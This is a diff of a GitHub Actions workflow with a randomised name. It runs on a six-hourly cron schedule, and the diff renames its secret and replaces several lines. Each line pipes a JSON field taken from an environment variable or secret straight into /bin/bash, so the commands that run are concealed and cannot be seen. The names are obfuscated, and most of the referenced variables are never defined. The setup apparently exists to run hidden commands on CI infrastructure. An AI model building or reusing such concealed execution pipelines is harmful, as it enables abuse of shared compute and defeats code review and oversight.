@@ -1,9 +1,9 @@
 name: xianghuaguo3451
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
+    - cron: '30 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,22 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: xianghuaguo3451
         env:
-          qc17: ${{ secrets.qc17 }}
+          jrlge833: ${{ secrets.jrlge833 }}
         run: |
-          echo $qc17 | jq -r .gdltc22120 | /bin/bash
-          echo $hitv182 | jq -r .aqvq1045 | /bin/bash
-          echo $dbjeu8631 | jq -r .lc24 | /bin/bash
-          echo $vy51 | jq -r .zoi4923 | /bin/bash
-          echo $vs6319 | jq -r .va9 | /bin/bash
-          echo $yncj3472 | jq -r .djg01896 | /bin/bash
-          echo $f4210 | jq -r .e4 | /bin/bash
-          echo $jj57 | jq -r .m6278 | /bin/bash
-          echo $frblx70 | jq -r .t3 | /bin/bash
-          echo $jks94228 | jq -r .tea9 | /bin/bash
-          echo $ujq154 | jq -r .yjs85 | /bin/bash
-          echo $s208 | jq -r .zv34931 | /bin/bash
-          echo $dbflh5 | jq -r .e19 | /bin/bash
-          echo $xc0555 | jq -r .gliof99693 | /bin/bash
-          echo $hiel8 | jq -r .mll31979 | /bin/bash
-          echo $izfr8 | jq -r .xidnv699 | /bin/bash
+          echo $jrlge833 | jq -r .gubrb37 | /bin/bash
+          echo $l88333 | jq -r .m1755 | /bin/bash
+          echo $tqvp072 | jq -r .s78 | /bin/bash
+          echo $wyll5597 | jq -r .amkfg12878 | /bin/bash
+          echo $cfyz93 | jq -r .ic66 | /bin/bash
+          echo $aorz3895 | jq -r .ap701 | /bin/bash
+          echo $vvlj04710 | jq -r .ulzk55701 | /bin/bash
+          echo $kwu29346 | jq -r .bzldk8704 | /bin/bash
+          echo $q63291 | jq -r .r035 | /bin/bash
 
